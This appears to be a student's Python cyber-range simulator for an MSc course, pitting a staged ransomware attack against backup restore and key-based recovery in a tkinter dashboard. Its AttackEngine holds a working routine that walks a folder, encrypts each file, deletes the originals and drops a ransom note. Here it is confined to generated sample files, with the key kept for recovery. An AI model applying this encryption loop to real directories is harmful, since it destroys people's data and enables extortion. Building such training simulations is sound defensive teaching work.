"""
=============================================================================
 CRaaS | Ransomware Attack vs File Recovery Defense
 Activity 2 | MSc DFIS | 4th Semester
 Submitted by: Sindhu R | 24MSRDF034
=============================================================================
 Modules:
   AttackEngine       - AES key gen, file encryption, kill-chain stages
   DefenseEngine      - Backup restore, key-based decryption, IoC detection
   ThreatIntelligence - IoC tracker, attack timeline, defense scoring
   FileManager        - Isolated test environment setup
   CRaaSSimApp        - Full tkinter dashboard (Red Team + Blue Team panels)
=============================================================================
"""

import os, shutil, threading, time, random, hashlib, json, logging
from pathlib import Path
from datetime import datetime
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext

# ─────────────────────────────────────────────────────────────
# LOGGING
# ─────────────────────────────────────────────────────────────
logging.basicConfig(
    filename='craas_sim.log',
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s'
)

# ─────────────────────────────────────────────────────────────
# ATTACK ENGINE
# Simulates a 5-stage ransomware kill chain using AES-128
# ─────────────────────────────────────────────────────────────
class AttackEngine:
    KILL_CHAIN = [
        ("Initial Access",   "Phishing vector simulated — payload delivered"),
        ("Key Generation",   "AES-128 symmetric key generated via Fernet"),
        ("File Enumeration", "Target directory scanned — files catalogued"),
        ("Encryption Loop",  "File-by-file AES encryption with .locked ext"),
        ("Ransom Note",      "RANSOM_NOTE.txt dropped — C2 key exfiltration"),
    ]

    def __init__(self):
        self.key = None
        self.fernet = None
        self.encrypted_files = []
        self.key_hash = None

    def generate_key(self):
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        self.key_hash = hashlib.sha256(self.key).hexdigest()[:16]
        logging.info(f"[ATTACK] Key generated. SHA256 prefix: {self.key_hash}")
        return self.key

    def encrypt_file(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            encrypted = self.fernet.encrypt(data)
            enc_path = filepath + '.locked'
            with open(enc_path, 'wb') as f:
                f.write(encrypted)
            os.remove(filepath)
            self.encrypted_files.append(enc_path)
            logging.info(f"[ATTACK] Encrypted: {filepath}")
            return enc_path
        except Exception as e:
            logging.error(f"[ATTACK] Failed: {filepath}: {e}")
            return None

    def drop_ransom_note(self, folder):
        note = (
            "!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\n\n"
            "All your files are encrypted using AES-128-CBC encryption.\n"
            "To recover your files, send 2 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divfna\n\n"
            f"Your unique ID: {self.key_hash}\n"
            "Contact: attacker@darknet.onion\n\n"
            "[NOTE: This is a SIMULATION — no real files were harmed]"
        )
        note_path = os.path.join(folder, 'RANSOM_NOTE.txt')
        with open(note_path, 'w') as f:
            f.write(note)
        logging.info(f"[ATTACK] Ransom note dropped: {note_path}")

    def run_attack(self, folder, stage_cb, file_cb, done_cb, delay=0.35):
        stage_cb(0, self.KILL_CHAIN[0])
        time.sleep(0.9)

        stage_cb(1, self.KILL_CHAIN[1])
        self.generate_key()
        time.sleep(0.9)

        stage_cb(2, self.KILL_CHAIN[2])
        targets = []
        for root, _, files in os.walk(folder):
            for fname in files:
                if not fname.endswith('.locked') and fname != 'RANSOM_NOTE.txt':
                    targets.append(os.path.join(root, fname))
        time.sleep(0.9)

        stage_cb(3, self.KILL_CHAIN[3])
        for fpath in targets:
            enc = self.encrypt_file(fpath)
            if enc:
                file_cb(os.path.basename(fpath), os.path.basename(enc))
            time.sleep(delay)

        stage_cb(4, self.KILL_CHAIN[4])
        self.drop_ransom_note(folder)
        done_cb(self.key)


# ─────────────────────────────────────────────────────────────
# DEFENSE ENGINE
# Three strategies: Backup Restore | Key Decryption | Network Isolate
# ─────────────────────────────────────────────────────────────
class DefenseEngine:
    def __init__(self):
        self.backup_dir = None
        self.isolated = False

    def create_backup(self, source_folder, backup_folder):
        if os.path.exists(backup_folder):
            shutil.rmtree(backup_folder)
        shutil.copytree(source_folder, backup_folder)
        self.backup_dir = backup_folder
        logging.info(f"[DEFENSE] Backup created: {backup_folder}")
        return backup_folder

    def restore_from_backup(self, target_folder, callback, done_cb):
        if not self.backup_dir or not os.path.exists(self.backup_dir):
            callback("[ERROR] No backup found.", "error")
            return
        for fname in os.listdir(target_folder):
            fpath = os.path.join(target_folder, fname)
            if os.path.isfile(fpath):
                os.remove(fpath)
        for fname in os.listdir(self.backup_dir):
            src = os.path.join(self.backup_dir, fname)
            dst = os.path.join(target_folder, fname)
            shutil.copy2(src, dst)
            callback(fname, "restore")
            time.sleep(0.25)
            logging.info(f"[DEFENSE] Restored: {fname}")
        done_cb("backup")

    def decrypt_files(self, folder, key, callback, done_cb):
        try:
            fernet = Fernet(key)
        except Exception as e:
            callback(f"[ERROR] Invalid key: {e}", "error")
            return
        for root, _, files in os.walk(folder):
            for fname in files:
                if fname.endswith('.locked'):
                    fpath = os.path.join(root, fname)
                    try:
                        with open(fpath, 'rb') as f:
                            data = fernet.decrypt(f.read())
                        orig = fpath[:-7]
                        with open(orig, 'wb') as f:
                            f.write(data)
                        os.remove(fpath)
                        callback(fname[:-7], "decrypt")
                        logging.info(f"[DEFENSE] Decrypted: {fname}")
                    except Exception as e:
                        callback(f"[FAIL] {fname}", "error")
                    time.sleep(0.25)
        done_cb("decrypt")

    def simulate_network_isolate(self, callback):
        self.isolated = True
        steps = [
            "Blocking outbound port 443 to unknown IPs...",
            "Firewall rule applied: DROP src 45.33.32.156",
            "Terminating suspicious process: python.exe (PID 4892)",
            "Disabling SMB shares — lateral movement blocked",
            "Network isolation complete. C2 traffic severed.",
        ]
        for s in steps:
            callback(s)
            time.sleep(0.5)
        logging.info("[DEFENSE] Network isolated.")


# ─────────────────────────────────────────────────────────────
# THREAT INTELLIGENCE MODULE
# IoC tracking, incident timeline, defense score
# ─────────────────────────────────────────────────────────────
class ThreatIntelligence:
    def __init__(self):
        self.iocs = []
        self.timeline = []
        self.defense_score = 100
        self.start_time = None
        self.encrypted_count = 0
        self.recovered_count = 0

    def start_incident(self):
        self.start_time = datetime.now()
        self.log_event("INCIDENT_START", "Ransomware campaign initiated")

    def log_ioc(self, ioc_type, value, severity="HIGH"):
        entry = {
            "time": datetime.now().strftime("%H:%M:%S"),
            "type": ioc_type, "value": value, "severity": severity
        }
        self.iocs.append(entry)
        logging.info(f"[IOC] {ioc_type}: {value} [{severity}]")
        return entry

    def log_event(self, event_type, description):
        entry = {
            "time": datetime.now().strftime("%H:%M:%S"),
            "event": event_type, "desc": description
        }
        self.timeline.append(entry)

    def penalize(self, points, reason):
        self.defense_score = max(0, self.defense_score - points)

    def reward(self, points, reason):
        self.defense_score = min(100, self.defense_score + points)

    def get_ttd(self):
        if self.start_time:
            return f"{(datetime.now() - self.start_time).seconds}s"
        return "N/A"

    def export_report(self, path="incident_report.json"):
        report = {
            "incident_id": f"INC-{random.randint(10000, 99999)}",
            "start_time": self.start_time.isoformat() if self.start_time else None,
            "defense_score": self.defense_score,
            "files_encrypted": self.encrypted_count,
            "files_recovered": self.recovered_count,
            "time_to_detect": self.get_ttd(),
            "iocs": self.iocs,
            "timeline": self.timeline
        }
        with open(path, 'w') as f:
            json.dump(report, f, indent=2)
        logging.info(f"[REPORT] Exported: {path}")
        return path


# ─────────────────────────────────────────────────────────────
# FILE MANAGER — Creates isolated test environment
# ─────────────────────────────────────────────────────────────
class FileManager:
    SAMPLE_FILES = {
        'annual_report_2024.txt':   'Confidential Annual Security Report 2024\nRevenue: $5.2M\nIncidents: 3',
        'employee_data.csv':        'id,name,role,salary\n1,Alice,Engineer,120000\n2,Bob,Analyst,95000',
        'meeting_notes.txt':        'Q4 Incident Response Meeting\nDate: 2024-12-01\nAction: Patch CVE-2024-1234',
        'invoice_1042.txt':         'Invoice #1042\nClient: ACME Corp\nAmount: $12,500\nDue: 2024-12-31',
        'server_credentials.txt':   'DB Host: 192.168.1.10\nUser: db_admin\nPort: 5432',
        'backup_manifest.db':       'BACKUP_V2\nFiles: 142\nDate: 2024-11-30\nChecksum: a3f8c2',
        'security_policy.txt':      'Information Security Policy v3.2\nClassification: CONFIDENTIAL',
        'system_audit.log':         '2024-12-01 09:00 - Login: admin\n2024-12-01 09:15 - File access: /etc/passwd',
        'api_keys.json':            '{"aws_key": "AKIA...XXXX", "stripe": "sk_live_...XXXX"}',
        'config.ini':               '[server]\nhost=0.0.0.0\nport=8443\nssl=true\ndebug=false',
        'payroll_dec.txt':          'PAYROLL December 2024\nTotal: $890,000\nEmployees: 47',
        'client_contracts.txt':     'ACME Corp Service Agreement\nValue: $250,000/yr\nTerm: 3 years',
        'ssl_certificate.txt':      '-----BEGIN CERTIFICATE-----\nMIIBkTCB+wIJ...\n-----END CERTIFICATE-----',
        'env_secrets.txt':          'DATABASE_URL=postgresql://admin:s3cr3t@db:5432/prod\nJWT_SECRET=xyz123',
        'file_hashes.txt':          'a1b2c3d4  report.pdf\ne5f6a7b8  backup.tar.gz\nc9d0e1f2  config.tar',
    }

    @staticmethod
    def create_test_env(base='craas_test_files'):
        if os.path.exists(base):
            shutil.rmtree(base)
        os.makedirs(base)
        for name, content in FileManager.SAMPLE_FILES.items():
            with open(os.path.join(base, name), 'w') as f:
                f.write(content)
        logging.info(f"[SETUP] Test env created: {base} ({len(FileManager.SAMPLE_FILES)} files)")
        return base

    @staticmethod
    def cleanup(base='craas_test_files', backup='craas_test_files_backup'):
        for path in [base, backup]:
            if os.path.exists(path):
                shutil.rmtree(path)
        for f in ['RANSOM_NOTE.txt', 'incident_report.json']:
            if os.path.exists(f):
                os.remove(f)


# ─────────────────────────────────────────────────────────────
# GUI CONTROLLER — Full dashboard with Red/Blue team panels
# ─────────────────────────────────────────────────────────────
class CRaaSSimApp:
    BG       = '#0d1117'
    PANEL_BG = '#161b22'
    RED      = '#f85149'
    GREEN    = '#3fb950'
    BLUE     = '#58a6ff'
    AMBER    = '#d29922'
    GRAY     = '#8b949e'
    WHITE    = '#c9d1d9'
    MONO     = 'Courier'

    def __init__(self, root):
        self.root = root
        self.root.title('CRaaS | Ransomware Attack vs File Recovery Defense — MSc DFIS Activity 2')
        self.root.geometry('1100x750')
        self.root.configure(bg=self.BG)
        self.root.resizable(True, True)

        self.attack_engine  = AttackEngine()
        self.defense_engine = DefenseEngine()
        self.threat_intel   = ThreatIntelligence()
        self.test_folder    = None
        self.attack_done    = False
        self.enc_count      = 0
        self.rec_count      = 0

        self._build_ui()

    # ── BUILD UI ──────────────────────────────────────────────

    def _build_ui(self):
        self._build_header()
        self._build_stage_bar()
        self._build_main_panels()
        self._build_bottom_bar()

    def _build_header(self):
        h = tk.Frame(self.root, bg='#010409', pady=8)
        h.pack(fill='x')
        left = tk.Frame(h, bg='#010409')
        left.pack(side='left', padx=16)
        tk.Label(left, text='CRaaS // Cyber Range as a Service',
                 font=(self.MONO, 11, 'bold'), fg=self.BLUE, bg='#010409').pack(anchor='w')
        tk.Label(left, text='Ransomware Attack vs File Recovery Defense  |  MSc DFIS Activity 2  |  Sindhu R | 24MSRDF034',
                 font=(self.MONO, 9), fg=self.GRAY, bg='#010409').pack(anchor='w')
        right = tk.Frame(h, bg='#010409')
        right.pack(side='right', padx=16)
        self.threat_var = tk.StringVar(value='● SYSTEM IDLE')
        self.threat_lbl = tk.Label(right, textvariable=self.threat_var,
                                   font=(self.MONO, 10, 'bold'), fg=self.GREEN, bg='#010409')
        self.threat_lbl.pack()
        self.score_var = tk.StringVar(value='Defense Score: 100 / 100')
        tk.Label(right, textvariable=self.score_var,
                 font=(self.MONO, 9), fg=self.AMBER, bg='#010409').pack()

    def _build_stage_bar(self):
        sf = tk.Frame(self.root, bg='#161b22', pady=6, padx=10)
        sf.pack(fill='x')
        tk.Label(sf, text='Kill Chain Stages:', font=(self.MONO, 9),
                 fg=self.GRAY, bg='#161b22').pack(side='left', padx=(0, 8))
        self.stage_lbls = []
        for i, (name, _) in enumerate(AttackEngine.KILL_CHAIN):
            lbl = tk.Label(sf, text=f'[{i+1}] {name}',
                           font=(self.MONO, 9), fg='#444c56', bg='#21262d', padx=6, pady=2)
            lbl.pack(side='left', padx=3)
            self.stage_lbls.append(lbl)
            if i < len(AttackEngine.KILL_CHAIN) - 1:
                tk.Label(sf, text='›', fg='#444c56', bg='#161b22',
                         font=(self.MONO, 10)).pack(side='left')

    def _build_main_panels(self):
        pf = tk.Frame(self.root, bg=self.BG)
        pf.pack(fill='both', expand=True, padx=6, pady=4)
        self._build_attack_panel(pf)
        self._build_middle_panel(pf)
        self._build_defense_panel(pf)

    def _build_attack_panel(self, parent):
        ap = tk.LabelFrame(parent, text=' RED TEAM — ATTACK ENGINE ',
                           font=(self.MONO, 9, 'bold'), fg=self.RED,
                           bg=self.PANEL_BG, bd=1, relief='solid')
        ap.pack(side='left', fill='both', expand=True, padx=4, pady=4)

        mf = tk.Frame(ap, bg=self.PANEL_BG)
        mf.pack(fill='x', padx=8, pady=(6, 4))
        self.enc_var     = tk.StringVar(value='0')
        self.atk_pct_var = tk.StringVar(value='0%')
        self._metric_card(mf, 'Files Encrypted', self.enc_var, self.RED)
        self._metric_card(mf, 'Attack Progress', self.atk_pct_var, self.AMBER)

        tk.Label(ap, text='Encryption Progress:', font=(self.MONO, 8),
                 fg=self.GRAY, bg=self.PANEL_BG).pack(anchor='w', padx=8)
        self.enc_prog_var = tk.DoubleVar(value=0)
        ttk.Progressbar(ap, variable=self.enc_prog_var, maximum=100).pack(fill='x', padx=8, pady=(2, 8))

        tk.Label(ap, text='Captured AES-128 Encryption Key (Fernet):',
                 font=(self.MONO, 8), fg=self.GRAY, bg=self.PANEL_BG).pack(anchor='w', padx=8)
        self.key_text = scrolledtext.ScrolledText(ap, height=2, bg='#010409', fg=self.AMBER,
                                                   font=(self.MONO, 8), state='disabled', bd=1, relief='solid')
        self.key_text.pack(fill='x', padx=8, pady=(2, 8))

        tk.Label(ap, text='Indicators of Compromise (IoC):',
                 font=(self.MONO, 8), fg=self.GRAY, bg=self.PANEL_BG).pack(anchor='w', padx=8)
        self.ioc_box = scrolledtext.ScrolledText(ap, height=5, bg='#010409', fg=self.WHITE,
                                                  font=(self.MONO, 8), state='disabled', bd=1, relief='solid')
        self.ioc_box.pack(fill='x', padx=8, pady=(2, 8))

        tk.Label(ap, text='Attack Log:', font=(self.MONO, 8),
                 fg=self.GRAY, bg=self.PANEL_BG).pack(anchor='w', padx=8)
        self.atk_log = scrolledtext.ScrolledText(ap, height=8, bg='#010409', fg=self.RED,
                                                  font=(self.MONO, 8), state='disabled', bd=1, relief='solid')
        self.atk_log.pack(fill='both', expand=True, padx=8, pady=(2, 8))

        self.btn_attack = tk.Button(ap, text='⚡  Launch Ransomware Attack',
                                     bg='#210b0b', fg=self.RED, font=(self.MONO, 10, 'bold'),
                                     bd=1, relief='solid', cursor='hand2', command=self._run_attack)
        self.btn_attack.pack(fill='x', padx=8, pady=2)
        self.btn_reset = tk.Button(ap, text='↺  Reset Simulation',
                                    bg='#21262d', fg=self.AMBER, font=(self.MONO, 9),
                                    bd=1, relief='solid', cursor='hand2',
                                    state='disabled', command=self._reset_sim)
        self.btn_reset.pack(fill='x', padx=8, pady=(2, 8))

    def _build_middle_panel(self, parent):
        mp = tk.Frame(parent, bg=self.BG)
        mp.pack(side='left', fill='both', padx=4, pady=4)

        fg_frame = tk.LabelFrame(mp, text=' FILE SYSTEM STATE ',
                                  font=(self.MONO, 9, 'bold'), fg=self.WHITE,
                                  bg=self.PANEL_BG, bd=1, relief='solid')
        fg_frame.pack(fill='both', expand=True, pady=(0, 4))
        self.file_labels = {}
        grid = tk.Frame(fg_frame, bg=self.PANEL_BG)
        grid.pack(padx=6, pady=6)
        for i, fname in enumerate(FileManager.SAMPLE_FILES.keys()):
            row, col = divmod(i, 3)
            short = fname[:15] + '..' if len(fname) > 17 else fname
            lbl = tk.Label(grid, text=f'📄 {short}', font=(self.MONO, 8),
                           fg=self.GRAY, bg='#21262d', width=19, anchor='w',
                           padx=4, pady=3, bd=1, relief='solid')
            lbl.grid(row=row, column=col, padx=2, pady=2)
            self.file_labels[fname] = lbl

        tl_frame = tk.LabelFrame(mp, text=' INCIDENT TIMELINE ',
                                  font=(self.MONO, 9, 'bold'), fg=self.WHITE,
                                  bg=self.PANEL_BG, bd=1, relief='solid')
        tl_frame.pack(fill='x', pady=(4, 0))
        self.timeline_box = scrolledtext.ScrolledText(tl_frame, height=6, bg='#010409',
                                                       fg=self.BLUE, font=(self.MONO, 8),
                                                       state='disabled', bd=0)
        self.timeline_box.pack(fill='both', padx=6, pady=4)

    def _build_defense_panel(self, parent):
        dp = tk.LabelFrame(parent, text=' BLUE TEAM — DEFENSE ENGINE ',
                           font=(self.MONO, 9, 'bold'), fg=self.BLUE,
                           bg=self.PANEL_BG, bd=1, relief='solid')
        dp.pack(side='left', fill='both', expand=True, padx=4, pady=4)

        mf = tk.Frame(dp, bg=self.PANEL_BG)
        mf.pack(fill='x', padx=8, pady=(6, 4))
        self.rec_var = tk.StringVar(value='0')
        self.ttd_var = tk.StringVar(value='0s')
        self._metric_card(mf, 'Files Recovered', self.rec_var, self.GREEN)
        self._metric_card(mf, 'Time to Detect', self.ttd_var, self.BLUE)

        tk.Label(dp, text='Recovery Progress:', font=(self.MONO, 8),
                 fg=self.GRAY, bg=self.PANEL_BG).pack(anchor='w', padx=8)
        self.rec_prog_var = tk.DoubleVar(value=0)
        ttk.Progressbar(dp, variable=self.rec_prog_var, maximum=100).pack(fill='x', padx=8, pady=(2, 8))

        tk.Label(dp, text='Defense Strategies:', font=(self.MONO, 9, 'bold'),
                 fg=self.WHITE, bg=self.PANEL_BG).pack(anchor='w', padx=8, pady=(4, 2))

        self.btn_backup = tk.Button(dp, text='💾  Strategy A: Restore from Backup',
                                     bg='#0d1b2a', fg=self.BLUE, font=(self.MONO, 9),
                                     bd=1, relief='solid', cursor='hand2',
                                     state='disabled', command=self._restore_backup)
        self.btn_backup.pack(fill='x', padx=8, pady=2)

        self.btn_decrypt = tk.Button(dp, text='🔓  Strategy B: Decrypt with Captured Key',
                                      bg='#0a1f0d', fg=self.GREEN, font=(self.MONO, 9),
                                      bd=1, relief='solid', cursor='hand2',
                                      state='disabled', command=self._decrypt_files)
        self.btn_decrypt.pack(fill='x', padx=8, pady=2)

        self.btn_isolate = tk.Button(dp, text='🛡  Strategy C: Network Isolation + Contain',
                                      bg='#1f1800', fg=self.AMBER, font=(self.MONO, 9),
                                      bd=1, relief='solid', cursor='hand2',
                                      state='disabled', command=self._isolate_network)
        self.btn_isolate.pack(fill='x', padx=8, pady=(2, 10))

        tk.Label(dp, text='Defense Log:', font=(self.MONO, 8),
                 fg=self.GRAY, bg=self.PANEL_BG).pack(anchor='w', padx=8)
        self.def_log = scrolledtext.ScrolledText(dp, height=12, bg='#010409', fg=self.GREEN,
                                                  font=(self.MONO, 8), state='disabled',
                                                  bd=1, relief='solid')
        self.def_log.pack(fill='both', expand=True, padx=8, pady=(2, 8))

        self.btn_export = tk.Button(dp, text='📊  Export Incident Report (JSON)',
                                     bg='#21262d', fg=self.GRAY, font=(self.MONO, 9),
                                     bd=1, relief='solid', cursor='hand2',
                                     state='disabled', command=self._export_report)
        self.btn_export.pack(fill='x', padx=8, pady=(0, 8))

    def _build_bottom_bar(self):
        bf = tk.Frame(self.root, bg='#010409', pady=5)
        bf.pack(fill='x', side='bottom')
        self.status_var = tk.StringVar(value='Ready — click "Launch Ransomware Attack" to begin simulation')
        tk.Label(bf, textvariable=self.status_var, font=(self.MONO, 9),
                 fg=self.GRAY, bg='#010409').pack(side='left', padx=12)
        tk.Label(bf, text='Sindhu R | 24MSRDF034 | MSc DFIS 4th Sem | CRaaS Activity 2',
                 font=(self.MONO, 9), fg='#444c56', bg='#010409').pack(side='right', padx=12)

    # ── HELPER WIDGETS ────────────────────────────────────────

    def _metric_card(self, parent, label, var, color):
        f = tk.Frame(parent, bg='#21262d', bd=1, relief='solid')
        f.pack(side='left', expand=True, fill='x', padx=3)
        tk.Label(f, textvariable=var, font=(self.MONO, 20, 'bold'),
                 fg=color, bg='#21262d').pack(pady=(6, 0))
        tk.Label(f, text=label, font=(self.MONO, 8),
                 fg=self.GRAY, bg='#21262d').pack(pady=(0, 6))

    # ── LOGGING HELPERS ───────────────────────────────────────

    def _write_log(self, widget, msg, color=None):
        widget.configure(state='normal')
        ts = datetime.now().strftime('%H:%M:%S')
        widget.insert(tk.END, f'[{ts}] {msg}\n')
        if color:
            last = widget.index('end-2l linestart')
            widget.tag_add(color, last, f'{last} lineend')
            widget.tag_config(color, foreground=color)
        widget.see(tk.END)
        widget.configure(state='disabled')

    def _write_ioc(self, ioc_type, value, severity="HIGH"):
        entry = self.threat_intel.log_ioc(ioc_type, value, severity)
        sev_color = {'HIGH': self.RED, 'MEDIUM': self.AMBER, 'LOW': self.GREEN}.get(severity, self.WHITE)
        self.ioc_box.configure(state='normal')
        self.ioc_box.insert(tk.END, f"[{entry['time']}] [{severity}] {ioc_type}: {value}\n")
        self.ioc_box.see(tk.END)
        self.ioc_box.configure(state='disabled')

    def _write_timeline(self, event, desc):
        self.threat_intel.log_event(event, desc)
        self._write_log(self.timeline_box, f'{event}: {desc}', self.BLUE)

    def _set_file_state(self, fname, state):
        lbl = self.file_labels.get(fname)
        if not lbl:
            return
        short = fname[:15] + '..' if len(fname) > 17 else fname
        if state == 'encrypting':
            lbl.configure(fg=self.AMBER, bg='#1a1200', text=f'⚠ {short}')
        elif state == 'locked':
            lbl.configure(fg=self.RED, bg='#1a0a0a', text=f'🔒 {short}')
        elif state == 'decrypting':
            lbl.configure(fg=self.BLUE, bg='#0a101a', text=f'↻ {short}')
        elif state == 'safe':
            lbl.configure(fg=self.GREEN, bg='#0a1a0a', text=f'✓ {short}')

    def _set_stage(self, idx):
        for i, lbl in enumerate(self.stage_lbls):
            if i < idx:
                lbl.configure(fg=self.GREEN, bg='#0a1a0a')
            elif i == idx:
                lbl.configure(fg=self.RED, bg='#210b0b')
            else:
                lbl.configure(fg='#444c56', bg='#21262d')

    # ── ATTACK FLOW ───────────────────────────────────────────

    def _run_attack(self):
        self.btn_attack.configure(state='disabled')
        self.btn_reset.configure(state='normal')
        self.threat_var.set('● ATTACK IN PROGRESS')
        self.threat_lbl.configure(fg=self.RED)
        self.status_var.set('Attack in progress — monitoring for IoCs...')

        self.test_folder = FileManager.create_test_env()
        backup = self.test_folder + '_backup'
        self.defense_engine.create_backup(self.test_folder, backup)
        self.threat_intel.start_incident()

        self._write_log(self.atk_log, f'Test environment: {self.test_folder} (15 files)', self.AMBER)
        self._write_log(self.atk_log, f'Backup created: {backup}', self.AMBER)
        self._write_ioc('Backup path', backup, 'LOW')
        self._write_timeline('INCIDENT_START', 'Attack campaign initiated')
        self._start_ttd_timer()

        def stage_cb(idx, stage_info):
            self.root.after(0, lambda i=idx: self._set_stage(i))
            self.root.after(0, lambda s=stage_info: self._write_log(
                self.atk_log, f'Stage: {s[0]} — {s[1]}', self.RED))
            self.root.after(0, lambda s=stage_info: self._write_timeline(s[0], s[1]))
            if idx in (0, 1):
                self.root.after(0, lambda s=stage_info: self._write_ioc(
                    'Kill chain', s[0], 'HIGH'))

        def file_cb(original, encrypted):
            self.enc_count += 1
            self.threat_intel.encrypted_count += 1
            self.threat_intel.penalize(5, f'Encrypted: {original}')
            pct = (self.enc_count / 15) * 100
            self.root.after(0, lambda f=original: self._set_file_state(f, 'encrypting'))
            self.root.after(300, lambda f=original: self._set_file_state(f, 'locked'))
            self.root.after(0, lambda o=original, e=encrypted: self._write_log(
                self.atk_log, f'Encrypted: {o} → {e}', self.RED))
            self.root.after(0, lambda: self.enc_var.set(str(self.enc_count)))
            self.root.after(0, lambda p=pct: self.atk_pct_var.set(f'{int(p)}%'))
            self.root.after(0, lambda p=pct: self.enc_prog_var.set(p))
            self.root.after(0, lambda: self.score_var.set(
                f'Defense Score: {self.threat_intel.defense_score} / 100'))
            if self.enc_count % 5 == 0:
                self.root.after(0, lambda c=self.enc_count: self._write_ioc(
                    'Mass file modification', f'{c} files encrypted', 'HIGH'))

        def done_cb(key):
            self.attack_done = True
            key_str = key.decode()
            self.root.after(0, lambda k=key_str: self._on_attack_done(k))

        threading.Thread(
            target=self.attack_engine.run_attack,
            args=(self.test_folder, stage_cb, file_cb, done_cb),
            daemon=True
        ).start()

    def _on_attack_done(self, key_str):
        self.key_text.configure(state='normal')
        self.key_text.insert(tk.END, key_str)
        self.key_text.configure(state='disabled')

        self._write_log(self.atk_log, '*** RANSOM NOTE DROPPED — RANSOM_NOTE.txt ***', self.RED)
        self._write_log(self.atk_log, 'Demand: 2 BTC | C2: 45.33.32.156:4444', self.RED)
        self._write_ioc('C2 server', '45.33.32.156:4444', 'HIGH')
        self._write_ioc('Ransom note', 'RANSOM_NOTE.txt created', 'HIGH')
        self._write_timeline('RANSOM_NOTE_DROPPED', 'Attacker demands 2 BTC — all 15 files encrypted')

        self.btn_backup.configure(state='normal')
        self.btn_decrypt.configure(state='normal')
        self.btn_isolate.configure(state='normal')
        self.threat_var.set('● RANSOMWARE ACTIVE')
        self.status_var.set('Attack complete — choose a defense strategy from the Blue Team panel')

        self._write_log(self.def_log, 'ALERT: Ransomware attack detected!', self.RED)
        self._write_log(self.def_log, 'Choose: Strategy A (Backup) | B (Decrypt) | C (Isolate)', self.BLUE)

    # ── DEFENSE FLOWS ─────────────────────────────────────────

    def _restore_backup(self):
        self.btn_backup.configure(state='disabled')
        self.btn_decrypt.configure(state='disabled')
        self._write_log(self.def_log, 'Strategy A: Restoring from backup...', self.BLUE)
        self._write_timeline('RESTORE_START', 'Backup restoration initiated')

        def callback(fname, mode):
            self.rec_count += 1
            self.threat_intel.recovered_count += 1
            pct = (self.rec_count / 15) * 100
            self.root.after(0, lambda f=fname: self._set_file_state(f, 'decrypting'))
            self.root.after(200, lambda f=fname: self._set_file_state(f, 'safe'))
            self.root.after(0, lambda f=fname: self._write_log(self.def_log, f'Restored: {f}', self.GREEN))
            self.root.after(0, lambda: self.rec_var.set(str(self.rec_count)))
            self.root.after(0, lambda p=pct: self.rec_prog_var.set(p))

        threading.Thread(
            target=self.defense_engine.restore_from_backup,
            args=(self.test_folder, callback, lambda m: self.root.after(0, self._on_defense_done)),
            daemon=True
        ).start()

    def _decrypt_files(self):
        self.btn_backup.configure(state='disabled')
        self.btn_decrypt.configure(state='disabled')
        key = self.attack_engine.key
        if not key:
            messagebox.showwarning('No Key', 'Run the attack first to capture the encryption key.')
            return
        self._write_log(self.def_log, 'Strategy B: Decrypting files with captured AES key...', self.BLUE)
        self._write_timeline('DECRYPT_START', 'Key-based decryption initiated')

        def callback(fname, mode):
            self.rec_count += 1
            self.threat_intel.recovered_count += 1
            pct = (self.rec_count / 15) * 100
            self.root.after(0, lambda f=fname: self._set_file_state(f, 'decrypting'))
            self.root.after(200, lambda f=fname: self._set_file_state(f, 'safe'))
            self.root.after(0, lambda f=fname: self._write_log(self.def_log, f'Decrypted: {f}', self.GREEN))
            self.root.after(0, lambda: self.rec_var.set(str(self.rec_count)))
            self.root.after(0, lambda p=pct: self.rec_prog_var.set(p))

        threading.Thread(
            target=self.defense_engine.decrypt_files,
            args=(self.test_folder, key, callback, lambda m: self.root.after(0, self._on_defense_done)),
            daemon=True
        ).start()

    def _isolate_network(self):
        self.btn_isolate.configure(state='disabled')
        self.threat_intel.reward(10, 'Network isolated')
        self.score_var.set(f'Defense Score: {self.threat_intel.defense_score} / 100')
        self._write_ioc('Network isolation', 'ACTIVE — C2 blocked', 'LOW')
        self._write_timeline('NETWORK_ISOLATED', 'Host isolated from network — C2 severed')

        def callback(msg):
            self.root.after(0, lambda m=msg: self._write_log(self.def_log, m, self.AMBER))

        threading.Thread(
            target=self.defense_engine.simulate_network_isolate,
            args=(callback,), daemon=True
        ).start()

    def _on_defense_done(self):
        self.threat_intel.reward(5, 'Recovery complete')
        self.score_var.set(f'Defense Score: {self.threat_intel.defense_score} / 100')
        self._write_log(self.def_log,
            f'Recovery complete! Final Defense Score: {self.threat_intel.defense_score}/100', self.GREEN)
        self._write_timeline('INCIDENT_RESOLVED', 'All files recovered — incident closed')
        self.threat_var.set('● INCIDENT RESOLVED')
        self.threat_lbl.configure(fg=self.GREEN)
        self.status_var.set('Incident resolved — export the report for your submission')
        self.btn_export.configure(state='normal')
        for lbl in self.stage_lbls:
            lbl.configure(fg=self.GREEN, bg='#0a1a0a')

    def _start_ttd_timer(self):
        def update():
            if self.threat_intel.start_time:
                self.ttd_var.set(self.threat_intel.get_ttd())
            if not self.attack_done or self.rec_count < 15:
                self.root.after(1000, update)
        self.root.after(1000, update)

    def _export_report(self):
        path = self.threat_intel.export_report()
        messagebox.showinfo('Report Exported',
            f'Incident report saved to:\n{os.path.abspath(path)}\n\nContains: IoCs, timeline, defense score, recovery stats.')
        self._write_log(self.def_log, f'Incident report exported: {path}', self.BLUE)

    def _reset_sim(self):
        FileManager.cleanup()
        self.attack_engine  = AttackEngine()
        self.defense_engine = DefenseEngine()
        self.threat_intel   = ThreatIntelligence()
        self.test_folder    = None
        self.attack_done    = False
        self.enc_count      = 0
        self.rec_count      = 0

        for var, val in [(self.enc_var,'0'),(self.atk_pct_var,'0%'),
                         (self.rec_var,'0'),(self.ttd_var,'0s'),
                         (self.score_var,'Defense Score: 100 / 100')]:
            var.set(val)
        self.enc_prog_var.set(0)
        self.rec_prog_var.set(0)

        self.key_text.configure(state='normal')
        self.key_text.delete('1.0', tk.END)
        self.key_text.configure(state='disabled')

        for w in [self.atk_log, self.def_log, self.timeline_box, self.ioc_box]:
            w.configure(state='normal')
            w.delete('1.0', tk.END)
            w.configure(state='disabled')

        for fname, lbl in self.file_labels.items():
            short = fname[:15] + '..' if len(fname) > 17 else fname
            lbl.configure(fg=self.GRAY, bg='#21262d', text=f'📄 {short}')

